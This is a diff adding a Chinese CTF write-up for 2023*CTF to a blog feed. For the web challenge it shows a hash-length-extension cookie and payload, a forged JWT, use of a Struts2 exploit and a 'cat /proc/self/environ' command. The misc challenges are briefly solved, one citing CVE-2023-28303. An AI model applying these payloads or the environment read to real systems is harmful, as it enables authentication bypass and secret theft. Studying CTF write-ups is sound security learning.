@@ -4,6 +4,37 @@
   
   
   <entry>
+    <title>2023*CTF</title>
+    <link href="/2023/10/11/2023starCTF/"/>
+    <url>/2023/10/11/2023starCTF/</url>
+    
+    <content type="html"><![CDATA[<h1 id="2023-CTF"><a href="#2023-CTF" class="headerlink" title="2023*CTF"></a>2023*CTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h2><h3 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a><strong>jwt2struts</strong></h3><p>源码里提示访问<code>JWT_key.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>刚开始在想怎么爆破没想到绕过，后面发现是哈希扩展长度攻击绕过md5，参考：<a href="https://blog.csdn.net/LYJ20010728/article/details/116779357">https://blog.csdn.net/LYJ20010728/article/details/116779357</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashpump</span> -s e6ccbf12de9d33ec27a5bcfb6a3293df -d adminroot -k <span class="hljs-number">14</span> -a ddd<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Cookie: digest=9e2b0620d7214919beaea5998acdb7fd<br><br>username=%61%64%6d%69%6e&amp;password=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00ddd<br></code></pre></td></tr></table></figure><p><img src="/../img/2023starCTF/16969546245907.png" alt="img"></p><p>得到key：sk-he001ctf3r</p><p>jwt.io伪造token：<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjIxNDE3N30.eoaKqDM23OT-iEZBhva5Yc-GKN876B9f-cbkqaQodgM</code></p><p><img src="/../img/2023starCTF/16969546245871.png" alt="img"></p><p><img src="/../img/2023starCTF/16969546245882.png" alt="img"></p><p>strust2一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/environ<br></code></pre></td></tr></table></figure><p><img src="/../img/2023starCTF/16969546245883.png" alt="img"></p><p><img src="/../img/2023starCTF/16969546245884.png" alt="img"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h2><h3 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a><strong>snippingTools</strong></h3><p>CVE-2023-28303</p><p><a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a></p><p><img src="/../img/2023starCTF/16969546245885.png" alt="img"></p><h3 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a><strong>old language</strong></h3><p>谷歌识图</p><p><a href="https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93">https://zh.fonts2u.com/dovahkiin.%E5%AD%97%E4%BD%93</a></p><p><img src="/../img/2023starCTF/16969546245886.png" alt="img"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+      <category>wp</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>misc</tag>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>sql注入</title>
     <link href="/2023/10/10/sql%E6%B3%A8%E5%85%A5/"/>
     <url>/2023/10/10/sql%E6%B3%A8%E5%85%A5/</url>
